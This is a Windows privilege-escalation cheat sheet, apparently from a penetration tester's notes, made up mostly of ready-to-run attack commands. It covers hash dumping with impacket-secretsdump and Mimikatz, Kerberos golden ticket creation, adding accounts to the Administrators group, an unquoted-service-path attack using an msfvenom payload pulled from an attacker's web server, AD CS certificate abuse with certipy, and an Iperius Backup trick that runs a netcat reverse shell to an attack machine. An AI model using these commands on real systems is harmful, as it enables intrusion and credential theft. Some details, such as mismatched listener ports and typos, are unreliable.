---
title: Windows Privilege Escalation
desc: 
tags: [ActiveDirectory, LAPS, PowerShell, PrivEsc, Privilege, ShellBag, Windows, WMIC]
alts: [LAPS-Pentesting, PowerShell, Privilege-Escalation-Linux]
render_with_liquid: false
---

## Interact from Linux

Using **impacket-psexec**.

```sh
impacket-psexec username:password@<target-ip>
```

<br />

## Enumeration

1. **Use Impacket**

    ```sh
    # Basic
    impacket-secretsdump example.local/username:password@<target-ip>

    # Only NTLM hashes and Kerberos keys
    impacket-secretsdump -just-dc example.local/username:password@<target-ip>

    # Only NTLM hashes
    impacket-secretsdump -just-dc-ntlm example.local/username:password@<target-ip>

    # SAM and SYSTEM
    impacket-secretsdump -sam sam.bak -system system.bak local
    ```

<br />

## Investigation

1. **Use Automation Tools**

    - **[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS){:target="_blank"}{:rel="noopener"}**

        1. **Download the WinPEAS on Your Local Machine**

            ```sh
            wget https://github.com/carlospolop/PEASS-ng/releases/download/20220710/winPEAS.bat
            ```

            Start web server to allow the target machine to get the WinPEAS.

            ```sh
            python3 -m http.server 8000
            ```

        2. **Transfer the WinPEAS using PowerShell on the Target Machine**

            ```powershell
            cd \Users\<user-name>\Desktop
            powershell

            Invoke-WebRequest -Uri http://<your-local-ip>:8000/winPEAS.bat -OutFile .\winPEAS.bat
            # or
            curl http://<your-local-ip>:8000/winPEAS.bat -o .\winPEAS.bat
            ```

        3. **Execute the WinPEAS**

            ```powershell
            .\winPEAS.bat
            ```

2. **OS Information**

    ```powershell
    hostname
    systeminfo
    systeminfo | findstr "OS"
    ver

    # Current user
    whoami
    whoami /user
    whoami /groups
    whoami /priv
    whoami /all
    echo %username%

    # List users and groups
    net users
    net user USERNAME
    net localgroup

    # Network
    ipconfig
    ipconfig /all
    print route
    arp -A

    # Firewall
    netsh firewall show state
    netsh firewall show config
    netsh advfirewall show allprofiles
    ```

3. **Running Services**

    Using **the Windows Management Instrumentation command-line (WMIC)** mainly.

    ```powershell
    wmic service list
    wmic service list | findstr "Backup"
    wmic service list | findstr "Iperius"  # Iperius is a backup service

    # List all Unquoted Service Paths
    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                              "
    # Get target process info
    wmic process get processid,parentprocessid,executablepath | find "<process-id>"

    # Get users SID
    wmic useraccount get name,sid

    # Launch the hidden executable hiding within ADS
    wmic process call create $(Resolve-Path .\file.exe:streamname)


    # Processes and services
    sc query state=all
    tasklist /svc

    # Query the configuration info for a specified service
    sc qc "Development Service"
    ```

4. **Histories**

    - **Command History in PowerShell Console**

        ```powershell
        type c:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
        ```

5. **Interect with the Volume Shadow Copy Service (VSS)**

    ```powershell
    vssadmin
    vssadmin list shadows
    vssadmin list volumes
    ```

6. **Find the Sensitive Data**

    ```powershell
    findstr /si password *.txt *.xml *.ini
    findstr /si cred *.txt *.xml *.ini
    findstr /spin "password" *.*
    findstr /spin "password" *.*
    dir /s *pass* == *cred* == *vnc* == *.config*
    reg query HKLM /f password /t REG_SZ /s

    # List files - all
    dir /a \Users\Administrator\Desktop
    # List files - display the owner of the file or folder
    dir /q \Users\Administrator\Desktop

    # Get contents of file
    more .\example.txt
    type .\example.txt

    # Check Recycle.bin and SID Folder
    cd \'$Recycle.bin'
    cd \'$Recycle.bin\S-1-5-21-198...334-1001'
    ```

7. **Use Mimikatz**

    **[Mimikatz](https://github.com/gentilkiwi/mimikatz){:target="_blank"}{:rel="noopener"}** dumps the Windows credentials and also manages Kerberos tickets.

    1. **Start Mimikatz**

        ```
        mimikatz
        ```

    2. **Check if Mimikatz Running as an Administrator**

        ```
        mimikatz # privilege::debug
        ```

    3. **Elevate to SYSTEM Level**

        ```
        mimikatz # token::elevate
        ```

    4. **Dump Hashes**

        ```
        mimikatz # lsadump::lsa /patch
        ```

        - **Security Identifier of the Kerberos Ticket Granting Ticket Account**

            ```
            mimikatz # lsadump::lsa /inject /name:krbtgt
            ```

        - **All SAM Local Password Hashes**

            ```
            mimikatz # lsadump::sam
            ```

        - **Credentials from the LSASS Memory**

            ```
            mimikatz # sekurlsa::logonpasswords
            ```

    5. **Create a Kerberos Golden Ticket**

        ```
        mimikatz # kerberos::golden /user:Administrator /domain:sample.domain /sid
        :S-1-5-21-849420856-2351964222-986696166 /krbtgt:7808900312cc005cf7082a9a89eb
        dfdf /id:500
        ```

    6. **Open a New Command Prompt**

        ```
        mimikatz # misc::cmd
        ```

8. **Registry Keys**

    - **ShellBags**

        A set of registry keys that store details about a viewed folder, such as its size, position, and icon.

        1. **Location**

            **c:\Users\<username>\AppData\Local\Microsoft\Windows\UsrClass.dat**  

            If you cannot found AppData folder in Explorer, click "View" tab and check "Hidden Items".

        2. **Access to Shellbag**

            1. **Search "regedit" on search bar and open "Registry Editor"**

            2. **Go to "Computer\HKEY_CLASSES_ROOT\LocalSettings\Software\Microsoft\Windows\Shell\Bags"**

        3. **ShellBags Explorer**

            Extract ShellBags information.

            1. **Open "ShellBags Explorer"**

            2. **Select "File" -> "Load offline hive"**

            3. **Navigate to the UsrClass.dat and open the file**

            4. **Find suspicious folder and file**

9. **.NET Decompiler**

    - **[ILSpy](https://github.com/icsharpcode/ILSpy){:target="_blank"}{:rel="noopener"}**

        .NET Decompiler with support for PDB generation, ReadyToRun, Metadata and more.

<br />

## Useful Commands

1. **Refer to LOLBAS**

    1. **[LOLBAS](https://lolbas-project.github.io/#){:target="_blank"}{:rel="noopener"}**

    2. **Other Commands**

        ```powershell
        # Edit file
        notepad .\example.txt
        edit .\example.txt
        nano .\example.txt
        vim .\example.txt
        vi .\example.txt

        # Move file
        move .\example.txt ..\Desktop\

        # Change permission of a file
        icacls 'C:\Path\to\file' /grant Users:F
        icacls 'C:\Path\to\file' /grant Everyone:F

        # --------------------------------------------------

        # Restart machine

        shutdown /r /t 0
        ```

<br />

## Change Credentials to Root Privileges, Remote Users

If you can change the user's permissions, connect WinRM or RDP using "evil-winrm", "remmina".

```powershell
# Change user's password
net user USERNAME NEWPASSWORD

# Add new user
net user /add USERNAME PASSWORD

# Add user to group
net localgroup Administrators USERNAME /add
net localgroup "Remote Managment Users" USERNAME /add   # WinRM
net localgroup "Remote Desktop Users" USERNAME /add     # RDP
```

<br />

## Take Ownership of a File (Administrators Group Required)

```powershell
# Check if the current user belongs to the Administrators group. 
net user USERNAME

# Move to the directory containing the desired file
cd \Users\Administrator\Desktop

# Enable an administrator to recover access to a file.
# /R: recursive operation
# /F: specify the filename
takeown /r /f *.*

# Modify dictionary access control lists on specified files
# /q: suppress success message
# /c: continue the operation despite any file errors
# /t: perform the operation on all specified files
# /grant: grant specified user access rights
icacls "example.txt" /q /c /t /grant Users:F
```

<br />

## Unquoteding Service Path to Privilege Escalation

```powershell

# In victim Windows machine

# Find unquoted service path
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                                "

# Confirm the information for the service
sc qc "Development Service"

# If the service path is "C:\Program Files\Development Files\Devservice Files\Service.exe",
# you can place the exploit to "C:\Program Files\Devservice.exe"

# -----------------------------------------------------------------

# In attack machine

# Create the exploit using msfvenom
msfvenom -p windows/exec CMD='net localgroup Administrators victim-user /add' -f exe-service -o Devservice.exe

# Start local web server
python3 -m http.server 8000

# -------------------------------------------------------------

# In victim Windows machine

# Start PowerShell
powershell
# Wget
Invoke-WebRequest -Uri http://<attack-ip>:8000/Devservice.exe -OutFile .\Devservice.exe
# Move the exploit to the target path
mv .\Devservice.exe '\Program Files\Development Files\'

# Change permission of the exploit
icacls 'C:\Program Files\Development Files\Devservice.exe' /grant Everyone:F

# Restart
shutdown /r /t 0
# or PowerShell's command
Restart-Computer
```

<br />

## Active Directory Certificate Services (AD CS) Privilege Escalation

AD CS is vulnerable to privilege escalation.

1. **Configure DNS**

    Modify DNS hostname on attack machine.

    ```sh
    10.0.0.1 vuln.com vulndc VULN-VULNDC-CA vuln.local
    ```

2. **Generate Certificate Test**

    ```sh
    # Request cerification
    certipy req 'vuln.local/username:password@vuln.com' -ca VULNDC-CA -template User

    # Authentication
    certipy auth -pfx administrator.pfx
    ```

3. **Add a Machine to the Domain**

    ```sh
    python3 ./impacket/examples.addcomputer.py 'vuln.local/username:password' -method LDAPS -computer-name 'MYPC' -computer-pass 'MyPcPassword'

    # Request certification for the computer
    # Use your own username and password (ex. 'MYPC$:MyPcPassword')
    certipy req 'vuln.local/MYPC$:MyPcPassword@vuln.com' -ca VULNDC-CA -template Machine

    # Authentication
    certipy auth -pfx mypc.pfx
    ```

4. **Update the DNS Hostname and SPN Attributes**

    ```sh
    # Connect using SSH
    ssh vuln.local\\username@vulndc

    # ---------------------------------------------

    # On target Windows machine

    # Start PowerShell
    powershell

    # Get the machine which participates the Active Directory
    Get-ADComputer MYPC -properties dnshostname,serviceprincipalname

    # Remove the current SPN attribute
    Set-ADComputer MYPC -ServicePrincipalName @{}

    # Then, set the DNS hostname to that of the DC
    Set-ADComputer MYPC -DnsHostName VULNDC.vuln.local
    ```

5. **Malicious Certificate (Get Another Machine Certificate)**

    ```sh
    # Request a new certificate for the computer again.
    certipy req 'vuln.local/MYPC$:MyPcPassword@vuln.com' -ca VULNDC-CA -template Machine

    # Then, we got a certificate for the another machine. 
    certipy auth -pfx ca.pfx
    ```

<br />

## Applications

1. **Computer Management**

    You can find all local users.

    1. **Search and open "computer management"**

    2. **Click "Local Users and Groups"**

    - **Users**

        1. **Click "Users"**

        2. **Double-click each user to get details e.g. "Member Of"**

    - **Groups**

        1. **Click "Groups"**

        2. **Double-click each group**

        3. **Attempt to add new user in the group. In most cases, however, it should do as administrator.**

2. **Disk Management**

    Check partitions with it.

    1. **Open the 'Disk Management'**

    2. **Right click the partition to view the properties**

    3. **Check 'Security' tab or 'Shadow Copies' tab**

    - **Check Partition in Windows Explorer**

        1. Right click the partition and click 'Change Drive Letter and Paths'
        2. Open dialog.
        3. Click 'Add'. In the dropdown, choose a letter (ex. Z:) and click 'OK'.
        4. At the top, in the Volume column, you should see that the partition has a letter (Z:) assigned to.
        5. Open Windows Explorer and check if Z: exists on 'This PC'.
        6. Click the partition (Z:) and click 'View' tab at the top then check 'Hidden Items'.

    - **Restore the previous version of partition**

        1. Right click the partition and click 'Properties' -> 'Previous Versions'
        2. Select shadow copy you want to restore and click 'Restore'. The Confirmation popup open, then click 'Restore'.

3. **Event Viewer**

    It lets administrators and users view the event logs on a local or remote machine.

    1. Search and open "Event Viewer".

4. **FullEventLogview**

    - **Search Event Logs**

        1. Open "Advanced Options".

5. **Sysinternals**

    Tools that offer technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment.

    ```sh
    # Autoruns
    # It shows what programs are configured to run during system bootup or login.
    autoruns.exe

    # Process Explorer
    # A freeware task manager and system monitor.
    procexp.exe
    procexp64.exe

    # Process Monitor
    # It monitors and displays in real-time all file system activity.
    procmon.exe
    procmon64.exe

    # Strings
    # It is same as the Linux “strings” command.
    strings.exe example.exe | findstr "sometext"
    strings64.exe example.exe | findstr "sometext"
    ```

6. **Task Scheduler**

    Coming soon.

7. **Iperius Backup Service (Privilege Escalation)**

    Iperius is vulnerable to privilege escalation.

    1. **Check if Iperius is Running in Target Machine**

        ```sh
        wmic service list | findstr "Iperius"
        ```

    2. **Create a .bat file (ex. "exploit.bat") and place it to Desktop.**

        When saving, be sure to save it as the file type "All Files". (NOT Text Documents (*.txt))

        ```powershell
        @echo off
        C:\Users\<USERNAME>\Downloads\nc.exe <attack_machine_ip> 1337 -e exploit.exe
        ```

    3. **Open Listener in Local Machine**

        ```sh
        nc -lvnp 4444
        ```

    4. **Settings in Target Machine**

        1. Click "Iperius" icon in Windows Explorer (path: C:\Program Files (x86)\Iperius Backup\Iperius).
        2. Right click the "Iperius" icon on the right-bottom of the bar to open it.
        3. Click "Create New Backup" and select "Add Folder".
        4. Enter path (c:\Users\<USERNAME>\Documents) and click "OK".
        5. Navigate to "Destination" tab and select "Add Destination Folder".
        7. Enter path (c:\Users\<USERNAME>\Descktop) and click "OK".
        8. Navigate to "Other Processes" tab.
        9. On "Before backup" section, check "Run a program or open external file:" and select "exploit.bat" file.

        - **Run**
            On "Iperius Backup" window, right-click on backup jobs "Documents" and select "Run backup as service" then click "OK" on the dialog.

    5. **Check if Incoming Connection Established in Local Machine**
